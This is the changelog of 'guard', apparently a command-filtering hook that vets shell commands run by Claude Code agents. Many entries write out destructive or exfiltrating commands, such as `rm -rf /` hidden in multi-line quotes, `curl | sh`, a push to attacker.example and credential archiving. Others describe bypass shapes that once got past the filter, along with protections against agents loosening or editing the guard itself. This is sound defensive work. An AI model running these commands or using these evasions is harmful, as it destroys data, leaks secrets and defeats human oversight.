# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and this project
adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Changed

- **Breaking:** guard denies or gives no decision, the same in every
  permission mode. It no longer returns `allow`, so no call it sees skips
  Claude Code's permission step or auto mode's classifier, and Claude Code's
  `permission_mode` is logged but never changes a decision. Rules that only
  steered a call toward a better shape are gone: plain redirects, `bash -c`,
  `git add -A`, `git branch -D`, `git remote add`, `git worktree add`,
  `git submodule add`, `git config` writes, exec env vars (`PYTHONPATH`,
  `GIT_SSH_COMMAND`), a variable or glob as the command name, `env -i`,
  `pip` / `npm` / `npx` installs from a URL, `crontab`, and the `git -C`
  subcommand list. Claude Code's classifier judges those calls. What guard
  still denies is in `docs/dangerous-commands.md`; where it is headed is in
  `docs/rules-design.md`. The trade-off: a destructive command hidden behind
  a variable or glob command name (`R=rm; $R -rf ~`) is left to the
  classifier.
- Guard sees through the wrappers that used to hide a command from it.
  `env` options are peeled (`env -i`, `-u NAME`, `-C DIR`, `--`), shell
  options before `-c` are skipped (`bash -o pipefail -c`, `bash -c --`),
  `ssh host --`, `docker container exec`, `docker compose exec` and `nsenter`
  payloads are checked, a shell reading a here-string or process
  substitution on stdin (`{ bash; } <<< '...'`) counts as running it, and an
  unfiltered `find . -delete` / `find .. -exec rm` is denied. Payloads a
  command hides (a function body, a trap handler, a `bash -c` string, a
  `find -exec` command) are checked as commands of their own. A `-c` string
  that is empty, a `{}` placeholder or runs a command named by an expansion
  (`bash -c "$X"`) is denied; `$` in an argument is fine.
- awk programs are checked: a literal command in `system()`,
  `print | "cmd"` or `"cmd" | getline` is checked as a command, and one built
  at run time (`system($0)`) is denied.
- Redirects into `.git/config`, `.git/hooks/`, `~/.gitconfig` and
  `$XDG_CONFIG_HOME/git/config` deny, and `>|` is read as a redirect
  rather than a pipe.
- The `bash.dangerous_construct` deny now names what actually matched:
  output run as code (`bash <(curl ...)`), or a redirect and the sensitive
  path it reaches.
- An inline program written out literally (`python3 -c '...'`,
  `python3 - <<'EOF'`, `node -e`, `node --input-type=module < file.mjs`,
  `osascript -e`, `ruby -e`, `perl -e`) passes: it is as visible as a
  script file, which already passes. A program from a pipe, a variable, a
  substitution or an unquoted heredoc that expands is denied, and so is one
  that evals
  stdin (`cat s | python3 -c 'exec(sys.stdin.read())'`, `ruby -e 'eval
  STDIN.read'`, `perl -ne 'eval'`). Each `osascript` `do shell script` string
  (and `do script`, `write text`, JXA `doShellScript`) is floor-checked like a
  `bash -c` string; one built at run time, `run script`, a raw Apple event and
  JXA `$.system` deny.
- Pipe-to-shell denies only when the consumer reads its program from stdin
  (`curl ... | sh`, `cat s | python3`, `cat s | python3 -`). Piping local data
  into a script or module (`python3 tool.py`, `python3 -m json.tool`) passes
  in every mode. Network output (`curl`, `wget`, `nc`, `ssh`, `gh api`, ...)
  piped into any shell or interpreter, or fed to one through a substitution, is
  denied whatever its arguments (`wget -qO- x | python3 tool.py`).
  `| python3 -m json.tool`, `| jq` and a literal `-c` / `-e` program with no
  code sink (`| python3 -c 'import json,sys; ...'`) only parse it and pass.
- `protected_files` protects the install that is running, found by its real
  path, not any path ending in `guard/hooks/<name>.py`: everything under its
  `src/`, `bin/run-hook` and `hooks/hooks.json` for a source checkout, the
  package directory for a wheel. A clone or worktree of guard's source is
  ordinary code an agent may edit; the live install stays protected in every
  mode. It matches the file, not the spelling: `~`, `$HOME`, variables the
  command sets (`F=...`, `for f in ...`), `cd`, `pushd` and `git -C` are
  resolved, a hard link or a spelling the volume folds is the same file, and
  removing, moving, hard-linking or copying into a directory that holds the
  install counts. A name it can't know (`$X`, `$(...)`) inside the install,
  or right beside it in a directory the command names, denies. The legacy
  hook-script patterns match only under `.claude/hooks/`.
- `protected_files` reads Bash the way bash does: comments, `$'...'`, line
  continuations, heredocs (a shell or interpreter reading one runs it; for
  anything else it is data), and `find -exec` with a read-only program. A
  command it can't read for sure (an unterminated quote, substitution or
  heredoc) denies when it names a protected path.
- The `protected_files` deny reason names the text that matched (a path in a
  script body, a relative target) next to the protected path it reaches.
- `GUARD_PROTECTED_EXTRA` and `.claude/guard-protected.txt` add up; a repo's
  file no longer replaces your environment variable.
- Deny reasons offer `guard allowlist disable-rule <rule_id>` as the only
  override. The protected-files deny for guard's code offers none.

### Removed

- **Breaking:** strict default-deny is gone. In 1.5.0, Claude Code's
  `auto`, `dontAsk` and `bypassPermissions` modes (or `CLAUDE_AUTONOMOUS=1`)
  made guard deny every command off its safe list and queue it to
  `GUARD_STRICT_DENY_QUEUE_PATH`. The queue, its variable and the
  `CLAUDE_AUTONOMOUS` fallback are gone with it. An allowlist that still sets
  `"mode": "lockdown"` runs as `enforce`, and each hook process prints one
  stderr line saying so.
- **Breaking for anyone with `allow_commands`:** per-command allowlisting
  is gone. `allow_commands` entries no longer exempt anything, and
  `guard allowlist allow-command` / `remove-command` no longer exist. Every
  exemption it held was a false positive that belonged fixed in the rule:
  turn the rule off with `guard allowlist disable-rule <rule_id>`, or report
  it. Per-repo `.claude/guard/allowlist.json` files are ignored too, `mode`
  included, and `--project` is gone from `guard allowlist` and `guard mode`
  (`--global` is still accepted and changes nothing). Config lives only in
  `~/.claude/guard/allowlist.json`: `mode` and `disable_rules`. An old file
  still loads. Guard ignores the retired key or project file, and the first
  time each hook process meets one it prints one stderr line naming it.
  Delete it to quiet the line.

### Security

- What a `$((` holds is checked: a substitution inside arithmetic
  (`echo $(( $(rm -rf /) + 1 ))`), or a `$((cd x; y) ; z)` that bash reads
  as nested subshells (`echo $((cd /tmp; echo a) ; rm -rf ~ )`). Both passed
  before.
- Development dependencies pulled in by pre-commit move past published
  advisories: `filelock` 4.2.4 and `virtualenv` 21.14.13. Installed guard
  doesn't use either.
- A repo can't loosen guard. Guard reads no mode or `disable_rules` from the
  working directory, so a cloned repo's `.claude/guard/allowlist.json` with
  `"mode": "off"` or disabled rules does nothing. What it does read there
  only adds limits: `.claude/guard-protected.txt` and
  `.claude/subagent-scope.json`.
- A command after a multi-line quoted argument is checked again. Guard split
  on every newline, so the line after a quoted newline began inside the
  quote and the `;`, `&&` or `|` after its closing quote read as quoted:
  `echo 'a<newline>b' ; rm -rf /` passed in every mode. A `system()` call in
  a multi-line awk program missed the awk floor the same way. Where the
  quoting can't be read exactly (a `#` comment, a heredoc, `alias`, `$'...'`,
  a backtick, `${x:-y}`), guard reads the command with the quoted lines
  joined as well as line by line, and denies if either reading denies. That
  reading skips heredoc bodies for every delimiter form (`<<'END-X'`,
  `<<END.X`, `<<\EOF`, `<<-EOF`) and reads a `<<` inside `$((...))` or
  `((...))` as a shift, but `((echo 'a'; b) ; c)` as nested subshells, as
  bash does. `echo 'a<newline>b' ; rm -rf / # x` passed in every mode before,
  as did the same command after a `<<'END-X'` heredoc whose body has an
  apostrophe.
- `watch`, `parallel` and `script -c` run their command through a shell, and
  that command is now split like a `bash -c` string. A second command in it
  (`watch -n1 'echo a; rm -rf /'`) passed before. The command is also found
  behind the values `watch` (`-n 1`, `--interval 2`, `-q 3`) and `parallel`
  (`-j 2`, `--tmpdir`, `--nice`, `--env`, `--tagstring`, `-J`, `--memfree`)
  take; an option guard doesn't list is read both with and without a value. A
  `parallel` placeholder is replaced inside a quoted command and for every
  `:::` argument by what it stands for: `{}` and `{1}` the argument, `{//}`
  its dirname, `{/}` its basename, `{.}` and `{/.}` the name without its
  extension. `parallel ::: 'rm -rf /'` runs its arguments as the commands
  they are. `script` is read through a clustered `-qc`, a leading `-c`,
  `--command <cmd>` or `--command=<cmd>`. macOS `script` has no `-c` and runs
  the words after its output file directly, so they are read as the command,
  after the options `-t` (which takes a value) and `-F` (which does not)
  (`script -q /dev/null make test`).
  `watch -n 1 'rm -rf /'`, `parallel -j 2 'rm -rf {}' ::: /`,
  `parallel 'rm -rf {//}' ::: ./build`,
  `parallel -j 2 'echo a ; rm -rf {} # x' ::: /`,
  `script --command 'rm -rf /' /dev/null`, `script -q /dev/null rm -rf /` and
  `script -F /dev/null rm -rf /` passed before.

### Fixed

- Over-blocking found by replaying real agent commands:
  - The fork bomb check reads only the function body, so `f() { ...; } && f`,
    `f 2>&1` and `f | head` pass, and its deny says "fork bomb".
  - Heredoc bodies are data. A body written to a file or fed to a filter no
    longer trips line-based rules (a code fence, a lone `]`, prose starting
    "at"). A heredoc read by a shell, `ssh`, `docker exec` or `xargs` is
    still commands, and `$(...)` / backticks in an unquoted body are still
    checked against the floor. An interpreter's program on stdin
    (`python3 - <<'EOF'`) is judged as that program, not line by line.
  - A `-c` string's command heads are found with its quotes and `$(...)`
    intact (`sh -c 'f=$(basename "$1"); ...'`).
  - An awk command that starts with a literal (`cmd = "wc -l " $1`) is
    checked by that literal; only a command built entirely at run time
    (`system($0)`) is denied.
  - A newline inside quotes no longer splits the command, so a multi-line
    awk, jq or `-c` program is one argument rather than one command per
    line. A program line such as `$4 <= 102800 {` is no longer denied as a
    command named by an expansion. When the quoting can't be read exactly
    (a heredoc, a `#` that may start a comment, a backtick, `$'...'`,
    `$(...)` inside double quotes, a `${...}` other than a plain name,
    `alias`, an unterminated quote), guard splits on every newline as before
    and also checks the command with the quoted lines joined.
- A brace inside quotes or after a backslash is left alone, as bash leaves it.
  Brace expansion split the line on whitespace and ignored quotes, so a
  quantifier such as `{1,2}` or `{3,}` in `grep -E "[0-9]{1,2} x|y"` became
  extra words, the quote broke, a later `|` split the command, and a
  fragment like `[Tt]ask` was denied as a glob command head. A quoted space
  no longer ends a word either. An unquoted `{a,b}` still expands and is
  checked as before. When the quoting can't be read exactly (an unterminated
  quote, a backtick, `$(...)` or a `${...}` other than a plain name inside
  double quotes) or an ANSI-C quote decodes to a quote or backslash
  (`$'\x27'`), every brace is expanded as before. A `$` ending a quoted regex
  (`'[Tt]ask$'`) is not an ANSI-C quote.
- Read-only guard CLI calls (`guard status`, `guard allowlist list`,
  `guard mode --help`, `guard allowlist --help`) no longer trip
  `protected_files`.
- `git -C <repo> fetch` passes. Only `--upload-pack`, `--exec` and an
  `ext::` remote, which run a program, deny.
- The `unknown_flags` telemetry `SECURITY.md` describes is written: an admin
  CLI command guard passes logs its unrecognized `--*` flags. It used to ride
  only on approvals, which admin CLI commands never got.
- Tests and the corpus no longer touch the developer's real home: conftest
  isolates `HOME`, `GUARD_DATA_DIR` and the decision-log paths, the corpus
  adjudicates against guard's shipped policy without writing logs, and a
  collection-time `decide()` call that wrote to the real decision log is gone.
- `bash.dangerous_interpreter` no longer blocks running a script or module
  (`uv run python tools/dev.py`, `python3 scripts/x.py`, `python -m pytest`).
  Those runs now pass through to Claude Code's own permission step. The rule
  now targets inline code only (eval flags such as `-c` / `-e` / `-p` / `-r`,
  a program on stdin, `python -m timeit`), read by a family-aware flag scan.
- `agent_output_guard` no longer blocks reading background command output.
  Claude Code writes background Bash output and subagent transcripts to the
  same `tasks/<id>.output` directory; the hook now resolves each path on disk
  and denies only subagent transcripts (a symlink into `subagents/` or a
  `.jsonl` file, or a file whose first line is a transcript record), wildcards
  under `tasks/`, and paths it cannot verify (missing, not a regular file,
  unreadable). `cat`, `tail`, `grep` and Read on a plain-text output file
  pass, whatever its size. The deny reason now points at the subagent's
  returned result instead of an unnamed query CLI.

## [1.5.0] - 2026-06-03

- Reduce bash-matcher friction, add corpus harness (#64)
- Use client-id for plugins dispatcher App auth (#59)
- Pass App credentials to cut-release reusable and bump SHA (#58)
- Bump plugins cut-release-reusable SHA for changelog filter fixes (#57)
- Bump plugins cut-release-reusable SHA for auto-changelog (#56)
- Notify plugins via GitHub App token instead of long-lived PAT (#55)
- Add cut-release dispatcher + plugins notify (#54)
- Hook sys.path bootstrap + claude plugin validate wiring (#53)

## [1.4.1] - 2026-05-19

### Fixed

- Release-workflow smoke step now installs the audited `[dev]` extras via
  `uv export` instead of a hardcoded `pytest pytest-cov pytest-xdist`
  list. The hardcoded list had drifted: `hypothesis` and `pytest-timeout`
  (both in pyproject's `[dev]` and continuously CVE-scanned by ci.yml's
  pip-audit job) were missing, so two test files failed to import at
  release-smoke time. v1.4.0 reached TestPyPI but never published to
  production PyPI because of this; v1.4.1 ships the v1.4.0 feature set
  plus this fix.

### Security

- `bash.git_force_push`: closes a positional force-push bypass. Literal-prefix
  matching on `ALWAYS_DENY` caught `git push -f` and `git push
  --force-with-lease` only when the flag immediately followed `git push`.
  Positional forms (`git push origin main -f`,
  `git push origin main --force-with-lease`) passed through because the prefix
  anchor was broken by the positional remote/ref. New `_is_git_force_push`
  synth-deny matcher scans every token after `git push` for any member of
  `{-f, --force, --force-with-lease, --force-if-includes, --mirror}` including
  the `=value` attached form. Allowlist-overridable.
- `bash.gh_api_destructive`: extended fused-verb handling to cover the
  `-X=VERB` form. The matcher previously caught `-X DELETE` (separate),
  `-XDELETE` (fused), and `--method=DELETE` (long-form fused-equals) but
  missed the shell-friendly `-X=DELETE` shape on the short flag. Same
  fix applies to PATCH and PUT.
- `_strip_git_global_options` now also consumes git's bare (no-value)
  globals (`--no-pager`, `--paginate`, `--bare`, `--no-replace-objects`,
  `--no-optional-locks`, and the `*-pathspecs` family). Without this,
  `git --no-pager submodule add <url>` shifted the positional index past
  the `tokens[1]=="submodule"` anchor and slipped past
  `bash.git_submodule_add`. The fix applies uniformly across every git
  positional matcher (force-push, force-refspec, submodule-add,
  worktree-add).
- `_is_aws_s3_destructive` and `_is_kubectl_destructive` now strip
  leading global flags before the positional service/verb check. Shapes
  like `aws --region us-east-1 s3 rm s3://b --recursive` and
  `kubectl -n default delete pod nginx --all` were already denied
  end-to-end via the generic `bash.admin_default_deny` fallback, but
  the more specific rule_id is now surfaced in the audit log -- the
  operator-facing reason carries `bash.aws_s3_destructive` /
  `bash.kubectl_destructive` instead of the generic catch-all. Mirrors
  the leading-flag normalization already used by `_is_aws_destructive`,
  `_is_gcloud_destructive`, and `_is_az_destructive`.

### Added

- `permission_request` JSONL telemetry. New PermissionRequest hook
  (`permission_request_logger.py`) observes when Claude Code is about to
  prompt the user for permission and appends a row with `type:
  "permission_request"`, the tool name, redacted `tool_input_excerpt`,
  `tool_use_id`, `session_id`, `cwd`, and the active `permission_mode`.
  Observation-only -- the hook never blocks. Doesn't fire in `dontAsk` /
  `bypassPermissions` modes (Claude Code doesn't prompt then).
- `guard noisy` now includes `permission_request` rows by default,
  grouped under the synthetic bucket
  `(hook_id="permission_request", decision="<tool_name>")` so operators
  see prompt frequency alongside deny frequency. Pass `--no-prompts` to
  exclude.
- Shadow/off mode (config-driven). New top-level `mode` field on
  `.claude/guard/allowlist.json` accepts `"enforce"` (default),
  `"shadow"`, or `"off"`. Set via `guard mode <value> [--project|--global]`.
  In shadow, denies are logged with `mode: "shadow"` but the hook exits 0
  with empty stdout — useful for testing a new rule against real
  sessions before promoting. In off, the hook short-circuits and writes
  no decision row. Project mode overrides global; global overrides
  default. `guard status` surfaces the resolved mode.
- `guard mode [enforce|shadow|off]` CLI subcommand reads or writes the
  mode for the current scope.
- `guard healthcheck` CLI subcommand: synthesises two independent
  always-deny PreToolUse payloads, asserts each comes back with the
  expected `permissionDecision: deny` + rule_id substring in the reason.
  Exit 0 = healthy. Suitable for CI gates and external monitoring.
- `guard migrate-log` CLI subcommand: one-shot, idempotent rewrite of the
  JSONL decision log to schema v1. Writes a sibling `.bak.<UTC-timestamp>`
  by default; `--dry-run` reports counts without writing; `--no-backup`
  skips the backup. Recommended to pause Claude Code sessions during the
  migration so concurrent appends don't land on the orphaned inode.
- `internal_error` JSONL records emitted from `safe_main` before fail-open,
  so hook crashes become observable. Carries `exc_class`, redacted
  `exc_msg` (passed through the secret-redaction catalog), and a
  SHA256-truncated `traceback_hash` for bucketing repeat failures
  without leaking file paths or payload contents.
- `type` discriminator on every JSONL record (`"decision"` for existing
  rows, `"internal_error"` for the new shape). Backward-compatible:
  consumers reading older records (no `type` field) are treated as
  `decision`.
- `permission_mode` field on every decision record so operators can
  `jq '.permission_mode'` from the audit log.
- `guard status --json` now includes a `counters` object
  (`decisions_total`, `denies_total`, `internal_errors_total`,
  `last_activity_ts`) for Prometheus-style monitoring.
- `_BRACE_EXPANSION_TOKEN_CAP = 4096` aggregate cap on
  `bash_command_validator._expand_braces_in_line`. Closes a DoS shape
  where chained brace groups (`{a,b}{c,d}{e,f}{g,h}` with ~30 alts each
  gives ~810k tokens / ~100 MB) would balloon before the per-command
  length cap could fire. Capped expansions fall through to
  `bash.command_too_long`.

### Changed

- **Strict default-deny now reads Claude Code's documented `permission_mode`
  field** from PreToolUse hook input instead of the userland
  `CLAUDE_AUTONOMOUS` env var. The strict modes are `auto`, `dontAsk`,
  and `bypassPermissions` -- all three imply "no human at the prompt."
- **Deny-message wire format changed.** Every deny now leads with
  `guard [permission_mode=<mode>] denied: <rule_id>. ...`. Transcript
  scrapers / log indexers keying on the previous "Rule: ..." trailer
  must update.
- `.pre-commit-config.yaml` now wires the existing semgrep hook-rules
  (`no-prefix-predicate-in-readonly`, `no-startswith-in-predicate-field`)
  and a new `test-hygiene.yml` ruleset as `pre-push` hooks. Devs see
  violations locally before CI rejects them.
- Renames across registry, public Python symbols, env vars, queue file,
  and matcher rule_ids:
  - `autonomous_feedback` -> `strict_feedback`
  - `AUTONOMOUS_FEEDBACK` -> `STRICT_FEEDBACK`
  - `get_autonomous_deny` -> `get_strict_deny`
  - `_evaluate_autonomous` -> `_evaluate_strict`
  - `GUARD_AUTONOMOUS_QUEUE_PATH` -> `GUARD_STRICT_DENY_QUEUE_PATH`
  - `~/.claude/guard-autonomous-queue.jsonl` ->
    `~/.claude/guard-strict-deny-queue.jsonl`
  - rule_id `bash.admin_unknown_flag_autonomous` ->
    `bash.admin_unknown_flag_strict`

### Deprecated

- `CLAUDE_AUTONOMOUS` env var. One-minor-cycle fallback: when the env is
  set to a truthy value AND no explicit `permission_mode` is present (or
  the mode is `default`), guard escalates to `dontAsk` and emits a single
  stderr warning. Removed in the next minor release. Migrate to setting
  Claude Code's `--permission-mode` flag (or the documented session
  toggle) instead.

### Removed

- `STRICT_FEEDBACK` was previously `AUTONOMOUS_FEEDBACK`; the old name is
  not aliased.
- The old queue file `~/.claude/guard-autonomous-queue.jsonl` is no
  longer read or written. Any pending entries in that file are orphaned;
  migrate manually if needed. Pre-1.0 / pre-users.

### Migration

- Shells / CI exporting `CLAUDE_AUTONOMOUS=1`: switch to launching Claude
  Code with `--permission-mode dontAsk` (or `auto` for the
  classifier-mediated mode). The env-var fallback works for one minor
  cycle but emits a stderr warning. Removed in v1.5.0.
- Monitoring pointing at `~/.claude/guard-autonomous-queue.jsonl`: update
  to `~/.claude/guard-strict-deny-queue.jsonl`.
- Allowlist entries (`.claude/guard/allowlist.json`) referencing the old
  rule_id `bash.admin_unknown_flag_autonomous` (under `disable_rules` or
  `allow_commands.rule`) must be renamed to
  `bash.admin_unknown_flag_strict`. The old id silently no-ops -- guard
  treats unknown rule_ids as inert with a stderr warning at CLI time.
- Log consumers parsing deny reasons: the prefix `guard [permission_mode=
  <mode>] denied: <rule_id>` replaces the trailing `Rule: <rule_id>`. The
  `rule_id` is still surfaced, now leading.

### Tests

- New `tests/integration/test_canonicalize_properties.py` carries
  hypothesis property tests for the input-canonicalization pipeline:
  `_canonicalize` idempotence, `_normalize_segment` bounded
  convergence, `strip_inline_comment` quoted-`#` preservation +
  idempotence, and `_expand_braces_in_line` token-cap respect over a
  shape-space distinct from the existing brace-DoS property test.

## [1.3.1] - 2026-05-13

### Security

- Closed `gh api graphql` mutation bypass: `gh api -X DELETE|PATCH|PUT`
  was already denied via `bash.gh_api_destructive`, but
  `gh api graphql -f query='mutation { ... }'` is a POST to `/graphql`
  carrying a GraphQL mutation (`deleteIssue`, `archiveRepository`,
  `transferOwnership`, etc.) that slipped past the verb filter. The
  matcher now also denies any `gh api` invocation against the
  `graphql` / `/graphql` endpoint when the `mutation` keyword appears
  in the normalized command, and denies opaque-body shapes
  (`-f query=@file.graphql`, `-f query=-`) against the same endpoint.
  Read-only `query` / `subscription` shapes continue to pass through.

### Changed

- `bash.gh_api_destructive` deny reason now mentions both the raw
  DELETE/PATCH/PUT shape and the graphql mutation shape, and
  references concrete `gh repo delete` / `gh release delete`
  alternatives instead of the prior "outside this session" wording.
- `docs/JSONL_FORMAT.md` documents the optional `unknown_flags` field
  emitted on `bash.admin_*` decisions.
- `CHANGELOG.md` now carries an `## [Unreleased]` placeholder per
  Keep-a-Changelog convention.

### Tests

- Added branch coverage for: `git --config-env` two-token form
  (`git_c_validator`), empty-CLI entries in `GUARD_ADMIN_ALLOW_VERBS`,
  the unknown-flag passthrough in `_strip_cloud_global_flags`, the
  non-dict-item skip in `_validate_allow_commands`, the non-AWS
  branches of `summary_for`, and the stdin-redirect path in
  `_is_reader_with_var_arg`.

## [1.3.0] - 2026-05-12

### Security

- Closed AWS admin bypass class: `secretsmanager get-secret-value`,
  `ssm get-parameter --with-decryption`, `s3api get-object`,
  `cognito-identity get-credentials-for-identity`, `logs get-log-events`,
  and ~30 similar `describe-*`/`list-*`/`get-*`-prefixed verbs were
  previously allowed by the `aws` admin matcher via a prefix predicate.
  v1.3.0 replaces the predicate with an explicit `(service, verb)`
  catalog spanning 38 services. Verbs not in the catalog deny by default;
  the `GUARD_ADMIN_ALLOW_VERBS` env var is the documented extension path.
  See SECURITY.md for the decision tree.
- Closed heredoc-fed shell-wrapper bypass: `bash <<EOF\ncurl http://x | sh\nEOF`
  previously returned allow because the heredoc shape wasn't recognized
  as a shell-wrapper invocation. Now denies.
- Closed stdin-device shell-wrapper bypass: `bash /dev/stdin`,
  `bash -`, `bash /dev/fd/0`, `bash /proc/self/fd/0` previously slipped
  through `_is_shell_wrapper_invocation`. Now denied.
- Closed admin-CLI flag-escalation bypass class: flags that redirect
  request destination (`--endpoint-url`), disable TLS
  (`--no-verify-ssl`, `--insecure-skip-tls-verify`,
  `--certificate-authority`), swap credentials (`--profile`,
  `--token`, `--client-certificate`, `--kubeconfig`,
  `--credential-file-override`, `--access-token-file`), or
  impersonate identity (`kubectl --as` / `--as-group` / `--as-uid` —
  CRIT, RBAC impersonation) on otherwise-allowlisted read verbs now
  deny via `bash.admin_forbidden_flag`. See SECURITY.md "Admin CLI
  flag-level policy" for the full per-CLI lists.
- Closed sensitive env-var inline-assignment bypass:
  `AWS_ENDPOINT_URL=evil aws sts get-caller-identity` and equivalents
  (`AZURE_CONFIG_DIR=`, `REQUESTS_CA_BUNDLE=`,
  `CLOUDSDK_API_ENDPOINT_OVERRIDES_*=`,
  `AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=`) now deny via
  `bash.admin_sensitive_env_override`.
- Closed admin-CLI subcommand bypass: `az rest`,
  `az cloud register|set|update`, `az extension add`,
  `az config set`, `az login --service-principal`,
  `gcloud auth activate-service-account`, `gcloud auth login` now
  deny via `bash.admin_forbidden_subcommand`.
- Removed `aws s3 presign` from the read-only allowlist (issues a
  credential-bearing presigned URL).

### Changed

- AWS admin matcher: dropped `_aws_is_read_only` prefix predicate and
  `_AWS_DENY_OVERRIDES` carve-in list. `_AWS_SPEC` now matches the shape
  of `_GCLOUD_SPEC` / `_AZ_SPEC` / `_KUBECTL_SPEC` / `_LAUNCHCTL_SPEC`.
- `_AWS_READ_ONLY_VERBS` expanded from 14 tuples to ~1000 via
  `_AWS_READ_ONLY_VERBS_BY_SERVICE` (38 services).
- `dynamodb scan`, `dynamodb query`, `dynamodb batch-get-item`, and
  `rds generate-db-auth-token` removed from the read-only allowlist
  (these returned item content or credential material).
- `summary_for("aws")` returns "explicit verb catalog; see SECURITY.md".
- `bash.admin_default_deny` body now interpolates the failed verb tuple
  and ends with `add aws:<service>.<verb> to GUARD_ADMIN_ALLOW_VERBS to override.`
- CI gains a blocking `semgrep` job that fails on prefix predicates
  inside read_only_predicate functions.

### Added

- `.semgrep/rules/no-prefix-predicate-in-readonly.yml` and
  `.semgrep/rules/no-startswith-in-predicate-field.yml`: CI rules that
  fail the build if a `.startswith()` prefix predicate is reintroduced
  as a read-only check.
- New `semgrep` CI job alongside `bandit` / `pip-audit` / `vulture`.
- `tests/integration/test_aws_bypass_smoke.py`: E2E smoke for the 9
  named bypass shapes from the SECURITY.md threat model.
- `tests/integration/test_heredoc_bypass.py`: regression coverage for
  heredoc-fed shell wrappers.
- `tests/integration/test_stdin_device_bypass.py`: regression coverage
  for stdin-device shell-wrapper shapes.
- `tests/integration/test_admin_forbidden_flags.py` /
  `test_admin_forbidden_subcommands.py` /
  `test_admin_env_overrides.py` / `test_admin_unknown_flags.py` /
  `test_admin_red_team_shapes.py`: full coverage of the flag-level
  policy across aws/gcloud/az/kubectl.
- `tests/integration/aws_catalog_smoke_corpus.txt` + wheel-install
  install-smoke step that runs the corpus against the built wheel.
- `AdminCliSpec` extended with `forbidden_flags`,
  `forbidden_subcommands`, `known_flags`, `sensitive_env_vars`
  fields (back-compatible — default empty for non-admin specs).
- JSONL audit record gains `unknown_flags: [...]` field on admin-CLI
  decisions (flag names only, capped at 8, omitted when empty).

### Yanked

- v1.2.0 has been yanked from PyPI (reason: superseded by 1.3.0; fixes
  admin allowlist bypass for AWS `get-*` verbs that emit secret
  material). The git tag is preserved.

## [1.2.0] - 2026-05-12

### Added

- `bash.admin_default_deny`: cloud-admin CLIs (`aws`, `gcloud`, `az`, `kubectl`,
  `launchctl`) flip from verb-denylist to default-deny. Only verbs on the
  read-only allowlist pass; everything else denies. Override via
  `allow_commands`, `disable_rules`, or `GUARD_ADMIN_ALLOW_VERBS=<cli>:<verb.path>`.
- Mode-aware agent-guidance footer on every deny: interactive denies tell agents
  to explain + ask before applying overrides; autonomous denies tell agents to
  surface and stop.
- `guard test` accepts multiple commands in one invocation:
  `guard test "cmd1" "cmd2" "cmd3"`. JSON shape changed from
  `{"command", "results"}` to `{"commands": [{"command", "results"}, ...]}`.
  Single-command callers get a 1-element array.

### Fixed

- Three CRIT IAM escalation bypasses: `aws iam attach-user-policy`,
  `az role assignment create`, `gcloud projects add-iam-policy-binding`.
- HIGH `launchctl kickstart -k` persistence bypass.
- HIGH `--` end-of-flags terminator bypass on `az`/`gcloud`/`kubectl`
  extractors (`az account show -- storage blob upload`,
  `kubectl get pods -- delete deployment myapp`). Admin commands with tokens
  after `--` now deny without further interpretation.
- Internal: `_kubectl_verb` now returns multi-positional verbs so
  `kubectl auth can-i` and `kubectl config view` resolve correctly.

## [1.1.0] - 2026-05-11

### Added — new matchers

- `bash.process_tree_kill`: `kill -9 -1`, `killall5`, and
  `pkill -u <user>` / `killall -u <user>` are denied. Kill-all-reachable
  shapes take down the session itself and leave the host unrecoverable.
- AWS IAM policy mutations: `put-role-policy`, `put-user-policy`,
  `put-group-policy`, `detach-*-policy`, and `update-assume-role-policy`
  join the IAM `delete-*` deny set. Inline deny-all policies achieve
  account lockout without a deletion to undo.
- `osascript` joins the dangerous-interpreter set. `osascript -e
  'do shell script "..."'` is a full macOS shell-exec primitive
  equivalent to `sh -c`; the `-l JavaScript` variant is covered by the
  same matcher.
- `defaults write com.apple.loginwindow LoginHook …` (and any `*Hook`
  key on the loginwindow / loginitems domain) is denied as a
  persistence shape. Installs a script that runs at every macOS login.
- `git remote add|set-url|rename|remove|rm|prune|update|set-head|set-branches`
  are denied. The bare `git remote` (listing) and read-only forms
  (`-v`, `show`, `get-url`) still pass through. Closes the
  supply-chain redirect where `git remote set-url origin
  https://attacker.example/evil.git` followed by `git push` quietly
  pushes to the attacker.

### Added — CLI log-query filters

- `guard noisy`, `guard silent`, and `guard trace` accept `--decision`,
  `--hook`, and `--tool` flags. `JsonlReader.iter_records` already
  supported these filters internally; the CLI now exposes them so
  questions like "did Claude touch a `Write` tool this week with a
  `deny` decision?" need one command instead of `jq` plumbing.

### Fixed

- `subagent_scope`: relative paths in the Bash branch now resolve
  against the *payload* `cwd` (the agent's working directory at
  decide-time), not the hook process's cwd. Previously `echo x >
  src/allowed.py` with payload cwd `/tmp/sess/` could be wrongly
  denied if process cwd happened to be elsewhere.
- `agent_output_guard`: the `.output` matcher no longer fires on
  paths ending in `.output.bak` (or any `.output.<suffix>`). The
  trailing negative-lookahead class was missing the `.` character.
- `commit_message_validator` no longer reverse-engineers shell quoting
  with regex. Replaced with a single `shlex.split` pass plus a forward
  walk over the post-`git commit` token slice. The shell parser
  resolves quoting semantics, so escaped quotes inside `-m` bodies,
  no-space `-m"msg"`, combined `-am`, and unbalanced quotes are all
  handled uniformly. Tokenises linearly, so no scan-window cap is
  needed against adversarial input.
- `guard test` now fans out to all six bash-surface hooks instead of
  the three that were hardcoded in `cmd_test`. Concrete bypass this
  catches: `guard test "tar --create -f /tmp/x.tar ~/.aws/credentials"`
  now returns `ask` from `guard.credential_check` (was `passthrough`
  because `credential_check`, `agent_output_guard`, and
  `protected_files` were silently skipped by the CLI even though they
  act on `Bash` input).

### Changed — internals

- New `src/guard/hooks/_registry.py` is the single source of truth for
  the hook list. `HookSpec` entries with surfaces + a normalised
  `decide` adapter; adapters lazy-import their hook module so the
  registry stays import-time pure. `cmd_test`, `cmd_diff`,
  `allowlist.KNOWN_RULE_IDS`, and `_settings_reference_guard` derive
  from it. `tests/test_hook_registry.py` walks `src/guard/hooks/*.py`
  and asserts every `_HOOK_ID` literal is registered, so the next hook
  addition can't silently miss the wiring.
- `protected_files` exposes a pure `decide()` so the registry adapter
  and the production `hook()` share one code path instead of two that
  drift.

### Polish — deny-message copy

- Deny strings rewritten across `bash.gh_api_destructive`,
  `bash.gpg_secret_delete`, `bash.process_attach`, `bash.kernel_module_load`,
  `bash.network_policy_wipe`, `bash.sensitive_write`, `bash.persistence`,
  `bash.sudo_escalation`, `bash.disk_destruction`, `bash.aws_destructive`,
  and `bash.iac_destruction`. The "refuse." absolutism and matcher-internal
